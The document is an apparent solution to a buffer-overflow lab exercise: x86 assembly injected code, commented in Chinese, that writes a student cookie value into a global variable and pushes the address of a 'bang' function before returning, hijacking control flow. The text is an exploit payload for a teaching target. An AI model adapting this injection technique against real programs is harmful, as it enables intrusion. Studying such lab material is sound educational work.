movl $0x5d1ca039,%eax ;将学号cookie值传到%eax
movl %eax,0x0804d198 ;将%eax值传到global_value地址
pushl $0x080494a7 ;将bang函数地址入栈
ret 
